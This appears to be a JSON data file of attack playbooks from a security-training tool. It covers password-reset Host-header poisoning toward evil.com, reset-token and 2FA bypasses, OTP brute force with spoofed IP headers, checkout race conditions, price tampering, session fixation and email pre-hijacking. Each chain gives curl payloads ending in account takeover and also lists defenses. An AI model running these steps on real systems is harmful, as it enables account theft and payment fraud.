@@ -1,0 +1,504 @@
+{
+  "domain": "Auth",
+  "domainLabel": "Authentication / 2FA / logic",
+  "domainOrder": 6,
+  "source": "ARS3NAL",
+  "chains": [
+    {
+      "title": "Password reset: poisoning via the Host header",
+      "level": "newbie",
+      "impact": "Full account takeover by stealing the victim's reset token (higher on large programs).",
+      "why": "A single header swap turns a public reset form into token theft.",
+      "precondition": "The application builds the reset link from a request header (Host / X-Forwarded-Host), and the victim will click the link from the email.",
+      "tags": [
+        "password-reset",
+        "host-header",
+        "account-takeover"
+      ],
+      "realWorld": "PortSwigger lab 'Password reset poisoning via middleware'; GHSA advisories for Kanboard/MasaCMS on the Host header.",
+      "defense": "Build links from a server-side base URL via an allowlist; never trust Host / X-Forwarded-Host.",
+      "steps": [
+        {
+          "title": "Map the reset flow",
+          "kind": "checklist",
+          "q": "account-takeover",
+          "detail": "intercept POST /forgot-password with email=you@target.com in Burp; locate the reset link inside the received email"
+        },
+        {
+          "title": "Swap the Host header",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "change Host: target.com to Host: evil.com, resend, check if the email link host changed (test on your own account first)",
+          "success": "the link host in the email changed to evil.com"
+        },
+        {
+          "title": "Iterate header variants",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "X-Forwarded-Host: evil.com / duplicate Host headers / Host: target.com:80@evil.com / absolute-URI in request line"
+        },
+        {
+          "title": "Fallback via dangling-markup",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "when only partly injectable: X-Forwarded-Host: target.com?evil.com so the token rides to you as a query param"
+        },
+        {
+          "title": "Hit the victim",
+          "kind": "note",
+          "detail": "submit reset for email={USER_B} with the poisoned header; victim now receives a booby-trapped link"
+        },
+        {
+          "title": "Capture the token",
+          "kind": "script",
+          "q": "OOB HTTP logger (offline, stdlib)",
+          "detail": "run a listener (python3 -m http.server / Burp Collaborator / interactsh) and read the token from the path or Referer when the victim clicks"
+        },
+        {
+          "title": "Take over the account",
+          "kind": "note",
+          "detail": "curl -s 'https://target.com/reset-password?token=<captured>' -d 'password=Hacked123!' ; then log in",
+          "success": "200 and login with the new password"
+        }
+      ]
+    },
+    {
+      "title": "Password reset: token leakage and predictability",
+      "level": "newbie",
+      "impact": "Account takeover, often with no victim interaction.",
+      "why": "The reset token is the password itself: if it leaks or is predictable, the account is yours.",
+      "precondition": "The application issues a reset token by email, and you can observe your own flow and reset response.",
+      "tags": [
+        "password-reset",
+        "token-leak",
+        "predictable-token",
+        "account-takeover"
+      ],
+      "realWorld": "General technique; typical HackerOne ATO reports via the reset token; PortSwigger authentication labs.",
+      "defense": "A 128-bit random single-use token, short TTL, binding to the account, plus Referrer-Policy: no-referrer on the reset page.",
+      "steps": [
+        {
+          "title": "Inspect your own reset response",
+          "kind": "checklist",
+          "q": "account-takeover",
+          "detail": "POST /forgot-password, then read the JSON/HTML body and Location header for token / resetToken / code / otp"
+        },
+        {
+          "title": "Token straight in the response body",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "if the response (or a GET /reset?email= probe) returns the token, request it for the victim's email and read it directly",
+          "success": "token is visible in the response for another user's email"
+        },
+        {
+          "title": "Leak via Referer",
+          "kind": "note",
+          "detail": "open the reset page; if it loads analytics/3rd-party scripts, the token in the URL leaks via the Referer header (check DevTools Network) and lands in their logs"
+        },
+        {
+          "title": "Predictable or sequential token",
+          "kind": "note",
+          "detail": "pull several tokens back-to-back, diff them, test UUIDv1 / timestamp / md5(email) / incrementing id, then reproduce the victim's offline"
+        },
+        {
+          "title": "Reuse, no expiry, no binding",
+          "kind": "checklist",
+          "q": "account-takeover",
+          "detail": "reuse an old token, use it twice, or confirm it is not tied to the requesting session"
+        },
+        {
+          "title": "Step or response manipulation",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "skip a multi-step reset straight to POST /reset-password, or flip a verify response {\"otpValid\":false} to true to reach the set-password screen"
+        },
+        {
+          "title": "Set the victim's password",
+          "kind": "note",
+          "detail": "curl -s https://target.com/reset-password -d 'email={USER_B}&token=<derived>&password=Hacked123!'",
+          "success": "200, then login"
+        }
+      ]
+    },
+    {
+      "title": "Takeover via profile email change",
+      "level": "intermediate",
+      "impact": "Full takeover of the target account.",
+      "why": "Whoever owns the linked email owns every future reset, which makes the email field a true crown jewel.",
+      "precondition": "The application allows changing the account email under weak verification or a client-side check.",
+      "tags": [
+        "account-takeover",
+        "email-change",
+        "logic"
+      ],
+      "realWorld": "General technique; regular HackerOne ATO reports via unverified email change.",
+      "defense": "Require the current password and step-up, send a notification and confirmation to the OLD address, keep multi-step flow state on the server.",
+      "steps": [
+        {
+          "title": "Map the email change",
+          "kind": "checklist",
+          "q": "account-takeover",
+          "detail": "POST /account/email with email=new@evil.com; note whether it demands the current password or a confirm step"
+        },
+        {
+          "title": "No re-authentication",
+          "kind": "note",
+          "detail": "change email with no current-password check; chain with CSRF/clickjacking on this endpoint for cross-user impact"
+        },
+        {
+          "title": "Status spoofing in the response",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "if a confirm step returns {\"verified\":false} or 403, intercept the response and change it to true / 200 to force-confirm"
+        },
+        {
+          "title": "Skip the confirmation step",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "replay the final success request / POST /account/email/confirm directly without completing email confirmation"
+        },
+        {
+          "title": "Unverified recovery email",
+          "kind": "note",
+          "detail": "if an unverified secondary/recovery email is accepted, add @evil.com as recovery and reset through it"
+        },
+        {
+          "title": "Pivot to full takeover",
+          "kind": "note",
+          "detail": "curl -s https://target.com/forgot-password -d 'email={EMAIL}' ; capture token and log in",
+          "success": "the reset email arrives at {EMAIL}"
+        }
+      ]
+    },
+    {
+      "title": "2FA/OTP bypass at the logic level",
+      "level": "intermediate",
+      "impact": "Full MFA bypass given stolen or your own credentials.",
+      "why": "Logic flaws in MFA are everywhere and pay well, since they break the last line of defense.",
+      "precondition": "You have a valid username+password pair, and a 2FA prompt stands between you and the account.",
+      "tags": [
+        "2fa",
+        "mfa-bypass",
+        "logic",
+        "account-takeover"
+      ],
+      "realWorld": "PortSwigger labs '2FA simple bypass' and '2FA broken logic'.",
+      "defense": "Verify 2FA on the server bound to the authenticating session, single-use codes, don't trust client-supplied status.",
+      "steps": [
+        {
+          "title": "Map the 2FA step",
+          "kind": "checklist",
+          "q": "account-takeover",
+          "detail": "after the password step capture POST /login2 (mfa-code=) and any identity field like verify= / username="
+        },
+        {
+          "title": "Skip the step itself",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "finish the password step, then request a post-2FA page directly (GET /my-account); if it loads, 2FA is not enforced server-side",
+          "success": "GET /my-account opens without a code"
+        },
+        {
+          "title": "Status spoofing in the response",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "submit a wrong code, intercept the response, change {\"success\":false}/401 to true/200 or follow the 302 to the authenticated page"
+        },
+        {
+          "title": "Flaw in victim binding",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "log in with YOUR creds to reach 2FA, then set verify=carlos so a code is issued for the victim, and submit/brute against them"
+        },
+        {
+          "title": "Code reuse",
+          "kind": "checklist",
+          "q": "account-takeover",
+          "detail": "reuse a prior valid OTP, or replay the same code across sessions; confirm old codes still verify"
+        },
+        {
+          "title": "Abuse of backup codes",
+          "kind": "note",
+          "detail": "hit /2fa/backup-code with no throttle or short/enumerable codes, or disable 2FA via the recovery flow"
+        },
+        {
+          "title": "Confirm the session",
+          "kind": "note",
+          "detail": "curl -s https://target.com/my-account -H 'Cookie: session=<post-login>' ; session cookie is now fully privileged",
+          "success": "the account page is served as if logged in"
+        }
+      ]
+    },
+    {
+      "title": "OTP brute-force via rate-limit bypass",
+      "level": "intermediate",
+      "impact": "Brute-forcing a 2FA or reset OTP straight to takeover.",
+      "why": "4-6 digit codes die instantly once throttling is broken, which makes this the most reusable bypass in the game.",
+      "precondition": "A numeric OTP/2FA/reset code under a weak or bypassable rate limit.",
+      "tags": [
+        "otp",
+        "brute-force",
+        "rate-limit-bypass",
+        "2fa"
+      ],
+      "realWorld": "PortSwigger lab '2FA bypass using a brute-force attack'; classic rate-limit bypass reports via X-Forwarded-For.",
+      "defense": "Rate-limit per account+code pair on the server (not per IP/header), lock out after N attempts, OTP expiry and rotation, CAPTCHA.",
+      "steps": [
+        {
+          "title": "Find the throttling",
+          "kind": "checklist",
+          "q": "brute-force",
+          "detail": "fire 10-20 wrong codes at POST /verify and watch for 429 / lockout / CAPTCHA; note exactly what trips it"
+        },
+        {
+          "title": "Spoof the source IP",
+          "kind": "payload",
+          "q": "Brute Force Rate Limit",
+          "detail": "rotate X-Forwarded-For / X-Real-IP / X-Client-IP / True-Client-IP / X-Originating-IP per request (1.1.1.1, 1.1.1.2 ...)"
+        },
+        {
+          "title": "Case, encoding, and path tricks",
+          "kind": "payload",
+          "q": "Brute Force Rate Limit",
+          "detail": "alter method/path case, add a trailing / or %00 or ?x=1 or change Content-Type to dodge a path-keyed limiter"
+        },
+        {
+          "title": "Reset the counter",
+          "kind": "note",
+          "detail": "re-request a fresh OTP between batches if the counter resets per code, or null-byte the value as 0000%00"
+        },
+        {
+          "title": "Beat the limiter with a race",
+          "kind": "note",
+          "detail": "single-packet 20-30 guesses inside one window (gate='race1') to slip extra attempts past a per-time-window throttle"
+        },
+        {
+          "title": "Brute-force via Turbo Intruder",
+          "kind": "script",
+          "q": "otp_brute.py - OTP/2FA brute-force with rate-limit bypass",
+          "detail": "iterate 0000-9999 across rotated IPs, concurrentConnections=30, success marker = 302 / Set-Cookie / response-length change"
+        },
+        {
+          "title": "Take over",
+          "kind": "note",
+          "detail": "curl -s https://target.com/verify -H 'X-Forwarded-For: 1.2.3.4' -d 'mfa-code=<hit>' ; authenticated session issued",
+          "success": "Set-Cookie / 302 to the account issued"
+        }
+      ]
+    },
+    {
+      "title": "Checkout race: coupons and limits via single-packet",
+      "level": "intermediate",
+      "impact": "Reusing one-time coupons/gift cards, balance overspend, bypassing per-account limits; direct money.",
+      "why": "The flagship money bug of our time, where parallel requests beat almost any naive 'already used?' check.",
+      "precondition": "A server-side action protected by a check-then-act scheme over shared state (coupon used? balance? stock? claimed?).",
+      "tags": [
+        "race-condition",
+        "single-packet",
+        "coupon",
+        "business-logic"
+      ],
+      "realWorld": "PortSwigger research 'Smashing the state machine' and 'The single-packet attack' (James Kettle, 2023).",
+      "defense": "Atomic DB constraints, SELECT ... FOR UPDATE, a unique index on (coupon,user), idempotency keys, no check-then-act.",
+      "steps": [
+        {
+          "title": "Find the limited action",
+          "kind": "checklist",
+          "q": "race-condition",
+          "detail": "one-time coupon POST /cart/coupon code=SAVE90, gift-card redeem, '1 per account' claim, or withdraw/transfer"
+        },
+        {
+          "title": "Baseline single attempt",
+          "kind": "note",
+          "detail": "apply once legitimately and confirm the second attempt is rejected ('already used')"
+        },
+        {
+          "title": "Assemble the race in Repeater",
+          "kind": "payload",
+          "q": "Race Condition",
+          "detail": "add 20-50 identical requests to a tab group and choose 'Send group in parallel (single-packet attack)' over HTTP/2"
+        },
+        {
+          "title": "Turbo Intruder variant",
+          "kind": "note",
+          "detail": "race-single-packet-attack.py: engine.queue(target.req, gate='race1') x30 then engine.openGate('race1')"
+        },
+        {
+          "title": "Read the overspend",
+          "kind": "note",
+          "detail": "success = coupon applied multiple times / balance reduced once for many redemptions / stock goes negative",
+          "success": "coupon applied N times or stock went negative"
+        },
+        {
+          "title": "Lock in the profit",
+          "kind": "note",
+          "detail": "curl ... /checkout after looping the discount to drive cart total toward 0 (or inflate balance)"
+        }
+      ]
+    },
+    {
+      "title": "Price, quantity, and currency manipulation",
+      "level": "newbie",
+      "impact": "Buying for free or next to nothing, or minting store credit via refunds.",
+      "why": "The original business-logic classic: if the client sends the price, the client sets the price.",
+      "precondition": "The cart, checkout, or API trusts the client-supplied price, quantity, or currency.",
+      "tags": [
+        "business-logic",
+        "price-tampering",
+        "negative-value"
+      ],
+      "realWorld": "General technique (OWASP business-logic testing; classic price-tampering reports in e-commerce).",
+      "defense": "Compute price and total on the server from the product ID, validate the currency and reject negative quantities, ignore the client-supplied total.",
+      "steps": [
+        {
+          "title": "Capture add-to-cart and checkout",
+          "kind": "checklist",
+          "q": "business-logic",
+          "detail": "hunt the body/JSON for price= / amount= / unit_price= / currency= / qty= / total="
+        },
+        {
+          "title": "Tamper with the price",
+          "kind": "payload",
+          "q": "Business Logic Errors",
+          "detail": "set price=1 (or 0.01), proceed to pay, confirm the charged amount equals the tampered value",
+          "success": "exactly the tampered value is charged"
+        },
+        {
+          "title": "Negative quantity or value",
+          "kind": "payload",
+          "q": "Business Logic Errors",
+          "detail": "qty=-1 or amount=-100 to credit yourself or push the total below zero (refund / store-credit abuse)"
+        },
+        {
+          "title": "Currency swap",
+          "kind": "payload",
+          "q": "Business Logic Errors",
+          "detail": "change currency=USD to a low-value unit so '100' costs a fraction while goods/credit stay valued in the original"
+        },
+        {
+          "title": "Discount stacking",
+          "kind": "note",
+          "detail": "send multiple coupon= params, set percent=100, or re-add a removed discount via a tampered request"
+        },
+        {
+          "title": "Rounding and precision abuse",
+          "kind": "payload",
+          "q": "Business Logic Errors",
+          "detail": "tiny decimals (0.000001) or large item counts to exploit float rounding and underpay"
+        },
+        {
+          "title": "Confirm the order",
+          "kind": "note",
+          "detail": "curl ... /checkout then verify the order total and actual charge reflect the manipulation, not the catalog price"
+        }
+      ]
+    },
+    {
+      "title": "Session fixation: hijacking an authenticated session",
+      "level": "intermediate",
+      "impact": "Hijacking the victim's authenticated session.",
+      "why": "A textbook session bug that still survives wherever an application doesn't rotate the session ID on login.",
+      "precondition": "The application accepts an attacker-imposed session token and does NOT reissue it after authentication.",
+      "tags": [
+        "session-fixation",
+        "session",
+        "account-takeover"
+      ],
+      "realWorld": "OWASP Session Fixation; PortSwigger materials on session management.",
+      "defense": "Reissue the session ID on every privilege change (login), reject client-supplied IDs, set HttpOnly/Secure/SameSite.",
+      "steps": [
+        {
+          "title": "Observe session handling",
+          "kind": "checklist",
+          "q": "account-takeover",
+          "detail": "note the cookie (PHPSESSID / JSESSIONID / session) before login and check if its value changes after login"
+        },
+        {
+          "title": "Confirm the lack of rotation",
+          "kind": "note",
+          "detail": "log in; if the pre-login cookie value is still valid afterward, the ID is fixable",
+          "success": "the pre-login cookie value stays valid after login"
+        },
+        {
+          "title": "Obtain a known ID",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "grab an anonymous session, or set one via an accepted param/cookie (?sessionid=ATTACKER)"
+        },
+        {
+          "title": "Impose it on the victim",
+          "kind": "note",
+          "detail": "deliver the fixed session via a crafted link / XSS / Set-Cookie injection so the victim browses with your chosen ID"
+        },
+        {
+          "title": "The victim authenticates",
+          "kind": "note",
+          "detail": "victim logs in under the attacker-known ID, which is now privileged"
+        },
+        {
+          "title": "Ride their session",
+          "kind": "note",
+          "detail": "curl -s https://target.com/my-account -H 'Cookie: session=ATTACKER' ; open as the victim",
+          "success": "the victim's content under the fixed ID"
+        }
+      ]
+    },
+    {
+      "title": "Email verification bypass and pre-account-takeover",
+      "level": "newbie",
+      "impact": "Access to 'verified-only' features or silent takeover of accounts created later.",
+      "why": "Registration is the softest entry point, and email pre-hijacking or self-verification silently compromise future accounts.",
+      "precondition": "The application ties identity or features to an email verification step that can be skipped or pre-empted.",
+      "tags": [
+        "registration",
+        "email-verification",
+        "pre-account-takeover"
+      ],
+      "realWorld": "The pre-hijacking research (Sudhodanan and Paverd, 2022); typical email verification bypass reports.",
+      "defense": "Require verification before any account use, atomic uniqueness of the verified email, address canonicalization, forbid pre-hijacking of unverified addresses.",
+      "steps": [
+        {
+          "title": "Map registration and verification",
+          "kind": "checklist",
+          "q": "account-takeover",
+          "detail": "POST /register then GET/POST /verify-email?token=; note what 'verified' unlocks"
+        },
+        {
+          "title": "Skip verification",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "log in right after POST /register; if GET /dashboard loads unverified, the gate is client-side only",
+          "success": "GET /dashboard opens without verification"
+        },
+        {
+          "title": "Spoof the verification response",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "intercept the verify response and change emailVerified:0 / {\"verified\":false} to 1 / true"
+        },
+        {
+          "title": "Token self-verification",
+          "kind": "note",
+          "detail": "if the verification token is returned in the signup response or is predictable, confirm any email without inbox access"
+        },
+        {
+          "title": "Pre-hijack the victim's email",
+          "kind": "note",
+          "detail": "register {USER_B} (unverified) before they do; when they later sign up or join via SSO/OAuth the app may merge into your account"
+        },
+        {
+          "title": "Confusion via aliases and case",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "register Victim@target.com, victim+x@, or a trailing-space/Unicode variant to collide with the real account on a normalizing backend"
+        },
+        {
+          "title": "Inherit the account",
+          "kind": "note",
+          "detail": "curl -s https://target.com/login -d 'email={USER_B}&password=<your-original>' after the merge/normalization",
+          "success": "login into the victim's linked account"
+        }
+      ]
+    }
+  ]
+}
